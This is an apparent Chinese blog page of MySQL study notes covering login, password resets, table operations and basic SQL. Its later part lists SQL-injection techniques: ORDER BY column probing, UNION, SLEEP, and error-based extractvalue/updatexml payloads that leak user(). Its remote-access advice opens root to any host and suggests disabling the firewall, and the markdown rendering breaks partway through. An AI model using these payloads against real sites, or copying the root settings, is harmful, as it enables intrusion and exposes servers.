@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="幻心">
+
+
+
+
+
+<title>MySQL学习笔记 | 幻心&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">幻心&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">幻心&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MySQL学习笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">幻心</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 13, 2020&nbsp;&nbsp;20:00:09</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库即存储数据的仓库，是一个管理数据的软件</p>
+<h2 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h2><ul>
+<li>关系型数据库（也称结构化数据库）<ul>
+<li>MySQL：轻量级开源数据库，适用于中小型企业，性能较好</li>
+<li>MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台</li>
+<li>Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑</li>
+<li>DB2</li>
+<li>……</li>
+</ul>
+</li>
+<li>非关系型数据库（也称非结构化数据库）<ul>
+<li>redis、mongodb、Hbase、nosql等</li>
+</ul>
+</li>
+</ul>
+<h2 id="关系型数据库结构"><a href="#关系型数据库结构" class="headerlink" title="关系型数据库结构"></a>关系型数据库结构</h2><ol>
+<li>数据库：可以看成是一个“文件柜”中的“小格子”</li>
+<li>数据表：可以看成是一个具体的“文件”</li>
+<li>记录、字段、数据<ul>
+<li>一行，即一条记录</li>
+<li>一列，即一个字段</li>
+<li>行列交叉处，即数据</li>
+</ul>
+</li>
+</ol>
+<h1 id="MySQL登录和退出"><a href="#MySQL登录和退出" class="headerlink" title="MySQL登录和退出"></a>MySQL登录和退出</h1><p>登录MySQL有两种方式，一种是通过命令行登录进行操作，一种是通过工具登录进行操作，下面介绍通过DOS命令行进行登录</p>
+<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>如果想在任意位置登录MySQL，则需要配置环境变量，如何判断是否配置好，可通过查看MySQL版本的命令进行判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -V			#切记是大写的`V`</span><br></pre></td></tr></table></figure>
+
+<p>![image-20200213211507268](img/MySQL数据库基础知识笔记 .assets/image-20200213211507268.png)</p>
+<p>如果出现如下情况即没有配置好：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘mysql -V 不是内部或外部命令，也不是可运行的程序或批处理文件。</span><br></pre></td></tr></table></figure>
+
+<p>接下来进行配置，win7路径如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7--&gt;计算机--&gt;属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量--&gt;Path</span><br></pre></td></tr></table></figure>
+
+<p>大差不差，网上教程很多，配一下就完事儿了，此处省略**字</p>
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>在DOS命令行中，执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 主机名 -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-h：代表MySQL数据库主机名。本地主机名如：127.0.0.1。MySQL数据库默认端口号：3306</li>
+<li>-u：代表MySQL用户名。如：root</li>
+<li>-p：代表MySQL密码。如：root。在登录时，可以先不输入密码值</li>
+</ul>
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot -proot</span><br></pre></td></tr></table></figure>
+
+<h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<h2 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h2><p>如果忘记密码，莫慌，老夫看你骨骼惊奇，这个重置密码的方法，就赐予你了：</p>
+<h3 id="phpstudy重置数据库密码："><a href="#phpstudy重置数据库密码：" class="headerlink" title="phpstudy重置数据库密码："></a>phpstudy重置数据库密码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其他选项菜单--&gt;mysql工具--&gt;重置密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux（centos7）修改root密码："><a href="#Linux（centos7）修改root密码：" class="headerlink" title="Linux（centos7）修改root密码："></a>Linux（centos7）修改root密码：</h3><ul>
+<li>MySQL版本低于8：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.修改配置文件：vi /etc/my.cnf 	添加：skip-grant-tables	重启MySQL服务</span><br><span class="line"></span><br><span class="line">2.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">3.改密码：</span><br><span class="line">update mysql.user set authentication_string=password(‘root&#x27;),plugin=&#x27;mysql_native_password&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line">4.更新数据库：flush privileges;</span><br><span class="line"></span><br><span class="line">5.退出</span><br><span class="line"></span><br><span class="line">6.再次修改配置文件，注释掉skip-grant-tables，重启MySQL服务，即可</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>MySQL版本为8及以上：</li>
+</ul>
+<p><strong>这里改的是初始密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.查看原始密码：(两种方法)</span><br><span class="line">    1).	grep &quot;password&quot; /var/log/mysqld.log</span><br><span class="line">    2).	cat /var/log/mysqld.log | grep &quot;password&quot;</span><br><span class="line">    </span><br><span class="line">2.使用原始密码登录：	mysql -uroot -p</span><br><span class="line"></span><br><span class="line">3.执行命令：		ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的密码&quot;;</span><br><span class="line"></span><br><span class="line">4.重启服务即可</span><br></pre></td></tr></table></figure>
+
+<p><strong>重置过密码后忘记密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.修改配置文件：vi /etc/my.cnf 	添加：skip-grant-tables	重启MySQL服务</span><br><span class="line"></span><br><span class="line">2.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">3.清空:authentication_string字段,设置对应的host:%</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">update user set authentication_string=&#x27;&#x27; where user=&#x27;root&#x27;</span><br><span class="line"></span><br><span class="line">4.退出</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">5.修改配置文件，注释掉步骤一，重启MySQL服务</span><br><span class="line"></span><br><span class="line">6.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">7.alter user&#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;你的密码@123&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="允许外界连接的方法"><a href="#允许外界连接的方法" class="headerlink" title="允许外界连接的方法"></a>允许外界连接的方法</h2><ul>
+<li>改表法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">进入MySQL，执行以下命令：</span><br><span class="line"></span><br><span class="line">首先要能远程访问，修改root的host为%</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">GRANT ALL ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line">其次，修改连接方式：</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;你的数据库密码&#x27;;</span><br><span class="line">注意修改防火墙规则或者关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">整型				INT</span><br><span class="line"></span><br><span class="line">浮点型			   FLOAT</span><br><span class="line"></span><br><span class="line">日期				DATE		YYYY-MM-DD</span><br><span class="line"></span><br><span class="line">时间				TIME		HH-MM-SS</span><br><span class="line"></span><br><span class="line">时间戳			   TIMESTAMP</span><br><span class="line"></span><br><span class="line">字符				CHAR</span><br><span class="line">				 VARCHAR</span><br><span class="line">				 </span><br><span class="line">文本				TEXT</span><br></pre></td></tr></table></figure>
+
+<h1 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h1><p>在MySQL交互式环境中，所有命令必须以英文分号<code>;</code>结束</p>
+<p>MySQL不区分大小写，但是把系统命令和自定义值以大小写区分会便于查看和排错</p>
+<h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交互式环境：		CREATE DATABASE [IF NOT EXISTS] 数据库名 [CHARSET UTF8];</span><br><span class="line">DOS命令行：		  mysqladmin -uroot -proot CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>IF NOT EXISTS：可选项，如果不存在，则创建数据库</li>
+<li>数据库名：自定义</li>
+<li>CHARSET：设置数据库的默认字符集</li>
+</ul>
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224309784.png" alt="image-20200213224309784"></p>
+<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS] 数据库名;</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看数据库的字符集"><a href="#查看数据库的字符集" class="headerlink" title="查看数据库的字符集"></a>查看数据库的字符集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SHOW CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224320689.png" alt="image-20200213224320689"></p>
+<p>通过MySQL命令修改数据库的字符集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE 数据库名 DEFAULT CHARACTER SET gbk;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224329100.png" alt="image-20200213224329100"></p>
+<h1 id="MySQL数据表操作"><a href="#MySQL数据表操作" class="headerlink" title="MySQL数据表操作"></a>MySQL数据表操作</h1><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><p>只有进入数据库里，才能操作数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure>
+
+<h2 id="显示当前库中所有的数据表"><a href="#显示当前库中所有的数据表" class="headerlink" title="显示当前库中所有的数据表"></a>显示当前库中所有的数据表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名(字段1 字段1类型 字段1属性,字段2 字段2类型 字段2属性,……)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>字段类型：tinyint、int、bigint、char、varchar、text、date、time等</li>
+<li>字段属性：<ul>
+<li>NOT NULL|NULL：是否可以为空</li>
+<li>DEFAULT default_value：指该列的默认值<ul>
+<li>default_value默认值可以是字符串，也可以是整型</li>
+</ul>
+</li>
+<li>AUTO_INCREMENT：该列为自动增长型，或者自动编号。要求该列必须是整型。<strong>一个表只能有一个auto_increment属性</strong>。</li>
+<li>PRIMARY KEY：主键。指定该列的值具有唯一性，主键所在的列不能为空。<strong>一个表的主键只能有一个</strong>。</li>
+</ul>
+</li>
+</ul>
+<p>一个数据表，由多个列构成。多个列定义之间用英文下的<strong>逗号</strong>隔开。</p>
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224345141.png" alt="image-20200213224345141"></p>
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224355077.png" alt="image-20200213224355077"></p>
+<h2 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE [IF EXISTS] table_name;</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h2><p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224405979.png" alt="image-20200213224405979"></p>
+<p>这么麻烦的语句，你要用吗？删了在创建一个不就完事儿了</p>
+<h2 id="describe显示表的结构定义"><a href="#describe显示表的结构定义" class="headerlink" title="describe显示表的结构定义"></a>describe显示表的结构定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESCRIBE 表名;	或		DESC 表名;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0.assets/image-20200213224416297.png" alt="image-20200213224416297"></p>
+<h1 id="SQL基础"><a href="#SQL基础" class="headerlink" title="SQL基础"></a>SQL基础</h1><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="增加记录"><a href="#增加记录" class="headerlink" title="增加记录"></a>增加记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名(字段1,字段2,字段3,…) VALUES (值1,值2,值3,…)</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名 [WHERE 条件]</span><br></pre></td></tr></table></figure>
+
+<p><strong>WHERE条件：如果省略，将删除所有记录</strong></p>
+<h3 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 SET 字段1 = 新值1，字段2=新值2,… [WHERE条件]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>需要更新的字段列出，不需要更新的不用管它</li>
+<li>字段的顺序可以修改</li>
+<li>WHERE条件不能省略，如果省略，所有记录都会修改</li>
+</ul>
+<h3 id="查询记录"><a href="#查询记录" class="headerlink" title="查询记录"></a>查询记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表|* FROM 表名 [WHERE条件] [ORDER BY排序][LIMIT限制输出]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>字段字列表：查询某些字段的数据，各字段之间用逗号隔开，字段之间没有顺序</li>
+<li><em>：表示显示所有列的数据。如：select</em>  from news;</li>
+<li>where：指查询的条件</li>
+<li>ORDER BY：字段排序</li>
+<li>LIMIT：限制输出</li>
+</ul>
+<h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><h3 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h3><p>![image-20200213211347485](../img/MySQL数据库基础知识笔记 .assets/image-20200213211347485.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE id&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id&lt;100 and hits&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id=100 OR hits&lt;50;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by n		如果后面跟数字，是按照第n列数据排序，如果n超过字段数，就报错</span><br><span class="line"></span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>由此可判断此表有几列</strong></p>
+<h3 id="LIMIT-限制输出"><a href="#LIMIT-限制输出" class="headerlink" title="LIMIT  限制输出"></a>LIMIT  限制输出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT startrow,pagesize;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>startrow从指定的行数起，开始返回数据</p>
+</li>
+<li><p>pagesize返回的记录数</p>
+</li>
+<li><p>举例：</p>
+</li>
+<li><p>```<br>LIMIT 0,10;  //从第0行起，返回10条记录<br>LIMIT 10,10;  //从第10行起，返回10条记录<br>LIMIT 20,10;  //从第20行起，返回10条记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### LIKE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通配符：</p>
+<ul>
+<li>   表示任意的字符<br>%        表示任意的字符<br>？       表示一个字符<br>SELECT * FROM 表名 WHERE 字段名 LIKE ‘字符串’;        其中字符串可用通配符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### UNION  联合查询</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT 字段列表|* FROM 表1 UNION SELECT 字段列表|* FROM 表2;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**表1和表2中字段数应相同**</span><br><span class="line"></span><br><span class="line">### DISTINCT  去重</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT  DISTINCT field FROM table_name [WHERE 条件]；<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### GROUP_CONCAT  把查询结果链接一起</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT  group_concat(DISTINCT field) FROM table_name [WHERE 条件] ；<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 常用函数</span><br><span class="line"></span><br><span class="line">- 数据库信息类</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+version()          显示数据库版本信息</li>
+</ul>
+</li>
+</ul>
+<p>connection_id()    显示当前连接数</p>
+<p>user()           当前用户（current_user()、system_user()、session_user()）</p>
+<p>database()      查看当前使用的数据库</p>
+<p>schema()          查看当前使用的数据库</p>
+<p>@@hostname      获取当前计算机名称</p>
+<p>@@tmpdir         存放临时文件的路径</p>
+<p>@@datadir        存放数据的路径</p>
+<p>@@version        数据库版本</p>
+<p>@@basedir        数据库所在位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 字符串操作类</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>mid(string,start,length)               用来截取字符串中一部分</p>
+<p>SUBSTRING（str,start,length）            把str从start个字符开始截取length个字符，并输出</p>
+<p>ord()                                   用来显示字符的ASCII码</p>
+<p>concat()                               拼接字符串</p>
+<p>concat_ws()                           使用分隔符来拼接字符串<br>第一个参数是分隔符，支持16进制，不能用单双引号包括</p>
+<p>group_concat()                       和concat类似，拼接并分组显示数据</p>
+<p>INSERT(str1,start,length,str2)         把str1的第start个字符往后的length个字符替换为str2    </p>
+<p>LEFT(str,length)                     把str从左边开始截取length个字符并输出</p>
+<p>RIGHT(str,length)                     把str从右边开始截取length个字符并输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 其他</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>SLEEP(5)            让服务器等待5秒后返回0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 报错函数</span><br><span class="line"></span><br><span class="line">**extractvalue**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>extractvalue(XML_document，XPath_string):<br>    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>    第二个参数：XPath_string (Xpath格式的字符串)<br>    作用：从目标XML中返回包含所查询值的字符串<br>    select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**UPDATEXML**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>    第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>    第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>    作用：改变文档中符合条件的节点的值<br>    select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
